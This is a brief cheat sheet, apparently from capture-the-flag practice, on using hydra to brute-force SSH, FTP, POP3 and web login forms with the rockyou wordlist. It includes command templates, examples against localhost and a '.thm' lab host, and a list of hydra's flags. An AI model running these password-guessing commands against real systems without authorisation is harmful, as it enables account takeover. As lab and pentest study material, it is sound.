Used to brute force a password from a list
**SSH**
`hydra -l <username> -P /root/Tools/wordlists/rockyou.txt <ssh/pop3/ftp>://10.10.89.47 -s <port> `

**Webpage Login**
`hydra -l <username> -P /root/Tools/wordlists/rockyou.txt <URL> http-post-form "/<page>:username=^USER^&password=^PASS^:F=incorrect" -V`

Get the information from either ‘View page source’ or from Burpsuite
`hydra -l admin -P /root/Tools/wordlists/rockyou.txt -s 6767 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"``

Example:
`hydra -l hagrid -P /usr/share/wordlists/rockyou.txt hogwartz-castle.thm http-post-form "/login:user=^USER^&password=^PASS^&submit=submit:F=Incorrect Username or Password" -V -I`

**Flags**
`-l` Single Username
`-L` List of Usernames
`-p` Single Password
`-P` List of Passwords e.g. /root/Tools/wordlists/rockyou.txt
`-s` Specify Port (Default is 80)
`-F` Failed login message
`-V` Verbose
`-I` Ignore an existing restore file (don't wait 10 seconds)

Things to check:
•	Inspect the page and check what the username and password inputs are recorded as e.g:
```
<label for="inputEmail" class="sr-only">Username</label>
      <input type="text" name="username" class="form-control" placeholder="Username" required autofocus>
      <label for="inputPassword" class="sr-only">Password</label>
      <input type="password" name="password" class="form-control" placeholder="Password" required>
      <button class="btn btn-lg btn-primary btn-block" type="submit">Login</button>

```
